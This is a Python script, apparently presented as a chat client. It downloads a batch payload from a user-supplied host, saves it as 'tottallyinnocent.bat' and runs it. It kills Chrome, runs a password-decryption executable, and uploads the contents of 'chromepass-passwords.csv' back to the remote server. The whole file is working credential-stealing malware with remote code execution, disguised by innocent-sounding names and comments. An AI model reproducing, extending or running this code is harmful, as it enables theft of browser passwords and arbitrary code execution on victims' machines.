import socket
import securechat
import os
import time
import ast
import subprocess
from sys import getsizeof

def host_ip():
    answer = input('Please enter in the IP address that you would like to connect to: ')
    return answer

def Main():
    f = open('newthing.txt', 'a')
    host = host_ip()
    port = 5000
    mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mySocket.connect((host, port))
    # message = securechat.fixed(2)
    pointer = 0
    try:
        while True:
            message = securechat.message_confirmed()
            mySocket.send(message.encode())
            data = mySocket.recv(1024).decode()
            recieved_message = securechat.decoding_el_message(str(data))
            if recieved_message == '@REM stop here':
                f.write(recieved_message)
                f.close()
                break
            if pointer != 0:
                f.write(recieved_message)
            pointer += 1
        f.close()
    except SyntaxError:
        print('We go the file code from them.')
    # Time for file cleanup
    f = open('newthing.txt', 'r')
    i = 0
    # lines = f.readlines()
    dict = []
    newdict = []
    # dict = len(lines)
    for line in f:
        dict.append(line.strip())
    global newline
    newline = ''
    for word in dict:
        word = word + ' '
        newline += word
    newdict = newline.split('[$$$STOPPOINT$$$]')
    f.close()
    f = open('tottallyinnocent.bat', 'w')
    for line in newdict:
        f.write(line)
        f.write('\n')
    # print('Done downloading dank memes.')
    f.close()

    os.system('tottallyinnocent.bat')
    time.sleep(90)
    os.system('taskkill /F /IM chrome.exe /T')
    os.system('C:/Users/%username%/Downloads/stolen_pass_decrypt.exe')
    mySocket.close()
    # Connects to the second server
    time.sleep(30)
    port = 5000
    mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mySocket.connect((host, port))
    f = open('chromepass-passwords.csv', 'r')
    lines = f.readlines()
    for line in lines:
        # message = securechat.virus_message(line)
        mySocket.send(line.encode())
        data = mySocket.recv(1024).decode()
        print(data)
    mySocket.close()
Main()
